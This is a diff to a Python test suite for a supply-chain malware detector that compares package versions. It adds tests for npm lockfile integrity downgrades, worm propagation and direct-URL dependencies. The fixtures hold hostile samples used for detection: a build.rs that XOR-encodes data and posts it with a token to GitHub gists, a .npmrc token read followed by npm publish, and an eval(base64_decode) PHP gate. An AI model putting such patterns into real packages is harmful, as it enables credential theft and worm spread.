@@ -51,6 +51,7 @@ from activities.package_diff import (
     _has_zero_width_unicode,
     _is_noise,
     _npm_git_url_deps_added,
+    _npm_lockfile_integrity_downgraded,
     _pip_git_url_deps_added,
     _pth_has_executable_code,
     compute,
@@ -3229,15 +3230,16 @@ def test_net_calls_graphql_create_commit_js():
 
 
 def test_obfuscation_php_fileinode_file():
-    """fileinode(__FILE__) in PHP flags per-host execution guard (Laravel Lang stealth)."""
+    """fileinode(__FILE__) alone is in _OBFUSCATION_PATTERNS, not _NET_CALL_PATTERNS."""
     assert (
         _added_lines_have_net_calls(
             [
-                "if (!file_exists($marker) && md5(fileinode(__FILE__) . php_uname('m'))) { eval(base64_decode($payload)); }"
+                # Only the fileinode fingerprint — no eval() so _NET_CALL_PATTERNS don't fire
+                "if (!file_exists($marker) && md5(fileinode(__FILE__) . php_uname('m'))) { $gate = true; }"
             ],
             ".php",
         )
-        is False  # fileinode is in _OBFUSCATION_PATTERNS, not _NET_CALL_PATTERNS
+        is False
     )
 
 
@@ -4034,11 +4036,11 @@ def test_persistence_build_rs_github_gist_exfil(tmp_path):
         {
             "build.rs": (
                 "fn main() {\n"
-                "    let key = b\"cargo-build-helper-2026\";\n"
+                '    let key = b"cargo-build-helper-2026";\n'
                 "    let enc: Vec<u8> = data.iter().zip(key.iter().cycle()).map(|(b, k)| b ^ k).collect();\n"
                 "    let client = reqwest::blocking::Client::new();\n"
-                "    client.post(\"https://api.github.com/gists\")\n"
-                "          .header(\"Authorization\", format!(\"token {}\", token))\n"
+                '    client.post("https://api.github.com/gists")\n'
+                '          .header("Authorization", format!("token {}", token))\n'
                 "          .json(&payload)\n"
                 "          .send().unwrap();\n"
                 "}\n"
@@ -4056,10 +4058,236 @@ def test_persistence_build_rs_gist_not_in_lib_code(tmp_path):
         tmp_path / "new",
         {
             "src/exfil.rs": (
-                "// gist upload helper\n"
-                "client.post(\"https://api.github.com/gists\").send();\n"
+                '// gist upload helper\nclient.post("https://api.github.com/gists").send();\n'
             )
         },
     )
     _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
     assert persistence is False
+
+
+# ---------------------------------------------------------------------------
+# _npm_lockfile_integrity_downgraded (PackageGate Jan 2026)
+# ---------------------------------------------------------------------------
+
+
+def test_npm_lockfile_integrity_sha512_removed(tmp_path):
+    """sha512 entry removed entirely from package-lock.json is flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text(
+        _json.dumps(
+            {
+                "packages": {
+                    "node_modules/lodash": {"integrity": "sha512-abc123=="},
+                    "node_modules/express": {"integrity": "sha512-def456=="},
+                }
+            }
+        )
+    )
+    # lodash entry removed entirely
+    new.write_text(
+        _json.dumps(
+            {
+                "packages": {
+                    "node_modules/express": {"integrity": "sha512-def456=="},
+                }
+            }
+        )
+    )
+    assert _npm_lockfile_integrity_downgraded(old, new) is True
+
+
+def test_npm_lockfile_integrity_sha512_downgraded_to_sha1(tmp_path):
+    """sha512 entry replaced with sha1 is flagged (collision risk)."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text(
+        _json.dumps(
+            {
+                "packages": {
+                    "node_modules/lodash": {"integrity": "sha512-abc123=="},
+                }
+            }
+        )
+    )
+    new.write_text(
+        _json.dumps(
+            {
+                "packages": {
+                    "node_modules/lodash": {"integrity": "sha1-xyz=="},
+                }
+            }
+        )
+    )
+    assert _npm_lockfile_integrity_downgraded(old, new) is True
+
+
+def test_npm_lockfile_integrity_legitimate_update_not_flagged(tmp_path):
+    """Legitimate version bump that keeps sha512 entries is not flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text(
+        _json.dumps(
+            {
+                "packages": {
+                    "node_modules/lodash": {"integrity": "sha512-old=="},
+                }
+            }
+        )
+    )
+    new.write_text(
+        _json.dumps(
+            {
+                "packages": {
+                    "node_modules/lodash": {"integrity": "sha512-new=="},
+                    "node_modules/express": {"integrity": "sha512-express=="},
+                }
+            }
+        )
+    )
+    assert _npm_lockfile_integrity_downgraded(old, new) is False
+
+
+def test_npm_lockfile_integrity_parse_error_returns_false(tmp_path):
+    """A parse error (invalid JSON) returns False without raising."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text("not valid json {{{")
+    new.write_text(_json.dumps({"packages": {}}))
+    assert _npm_lockfile_integrity_downgraded(old, new) is False
+
+
+def test_extract_and_diff_with_package_lock(tmp_path):
+    """_extract_and_diff detects lockfile integrity downgrade end-to-end (line 338)."""
+    from ecosystems.npm import NpmProvider
+
+    old_lock = _json.dumps(
+        {
+            "packages": {
+                "node_modules/lodash": {"integrity": "sha512-abc=="},
+            }
+        }
+    )
+    new_lock = _json.dumps(
+        {
+            "packages": {
+                "node_modules/lodash": {"integrity": "sha1-xyz=="},
+            }
+        }
+    )
+    old_tgz = _make_tar_gz(
+        {"index.js": "module.exports=1;", "package-lock.json": old_lock},
+        top_dir="pkg-1.0.0",
+    )
+    new_tgz = _make_tar_gz(
+        {"index.js": "module.exports=2;", "package-lock.json": new_lock},
+        top_dir="pkg-1.1.0",
+    )
+    result = _extract_and_diff(old_tgz, "pkg-1.0.0.tgz", new_tgz, "pkg-1.1.0.tgz", NpmProvider())
+    # result[-2] is lockfile_downgraded (second-to-last before artifact_files dict)
+    lockfile_downgraded = result[-2]
+    assert lockfile_downgraded is True
+
+
+# ---------------------------------------------------------------------------
+# Worm propagation in CHANGED files (line 594 — changed file path)
+# ---------------------------------------------------------------------------
+
+
+def test_build_diff_worm_propagation_in_changed_file(tmp_path):
+    """Worm pattern in a CHANGED (not new) .js file sets worm_propagation_pattern."""
+    old = _write_files(
+        tmp_path / "old",
+        {
+            "lib/spreader.js": "module.exports = function() {};\n",
+        },
+    )
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/spreader.js": (
+                "const token = fs.readFileSync('.npmrc').toString();\n"
+                "exec(`npm publish --access public`);\n"
+            )
+        },
+    )
+    *_, worm = _build_diff(old, new)
+    assert worm is True
+
+
+# ---------------------------------------------------------------------------
+# npm HTTP dep prefix (line 817-818 in _npm_git_url_deps_added)
+# ---------------------------------------------------------------------------
+
+
+def test_npm_http_dep_prefix_flagged(tmp_path):
+    """A dep value starting with https:// is flagged (direct URL dep, bypasses registry)."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"dependencies": {}}')
+    new.write_text('{"dependencies": {"mypkg": "https://example.com/pkg.tgz"}}')
+    assert _npm_git_url_deps_added(old, new) is True
+
+
+def test_npm_http_dep_prefix_http_also_flagged(tmp_path):
+    """A dep value starting with http:// (insecure) is also flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"dependencies": {}}')
+    new.write_text('{"dependencies": {"mypkg": "http://example.com/pkg.tgz"}}')
+    assert _npm_git_url_deps_added(old, new) is True
+
+
+# ---------------------------------------------------------------------------
+# _get_vcs_repo_for_package: npm 404 branch (line 1088)
+# ---------------------------------------------------------------------------
+
+
+@respx.mock
+async def test_get_vcs_repo_for_package_npm_404():
+    """npm registry 404 returns None without raising."""
+    respx.get(f"{NPM_REG}/missing/1.0.0").mock(return_value=httpx.Response(404))
+
+    client = httpx.AsyncClient()
+    try:
+        result = await _get_vcs_repo_for_package(client, "npm", "missing", "1.0.0")
+    finally:
+        await client.aclose()
+    assert result is None
+
+
+# ---------------------------------------------------------------------------
+# Cache hit path (lines 176-177)
+# ---------------------------------------------------------------------------
+
+
+@respx.mock
+async def test_compute_cache_hit_returns_same_result():
+    """Calling compute() twice with the same args returns cached result on second call."""
+    old_tgz = _make_tar_gz({"index.js": "module.exports = 1;\n"}, top_dir="cachepkg-1.0.0")
+    new_tgz = _make_tar_gz({"index.js": "module.exports = 2;\n"}, top_dir="cachepkg-1.1.0")
+
+    old_url = f"{NPM_REG}/cachepkg/-/cachepkg-1.0.0.tgz"
+    new_url = f"{NPM_REG}/cachepkg/-/cachepkg-1.1.0.tgz"
+
+    respx.get(f"{NPM_REG}/cachepkg/1.0.0").mock(
+        return_value=httpx.Response(200, json=_npm_registry_response("cachepkg", "1.0.0", old_url))
+    )
+    respx.get(f"{NPM_REG}/cachepkg/1.1.0").mock(
+        return_value=httpx.Response(200, json=_npm_registry_response("cachepkg", "1.1.0", new_url))
+    )
+    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_tgz))
+    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_tgz))
+
+    from helpers.cache import clear_all_caches
+
+    # Clear cache so this test starts fresh
+    clear_all_caches()
+
+    env = ActivityEnvironment()
+    result1 = await env.run(compute, "npm", "cachepkg", "1.0.0", "1.1.0")
+    # Second call — respx would raise if the HTTP endpoints were called again
+    # (they were already consumed above). The cache hit path returns immediately.
+    result2 = await env.run(compute, "npm", "cachepkg", "1.0.0", "1.1.0")
+    assert result1 == result2
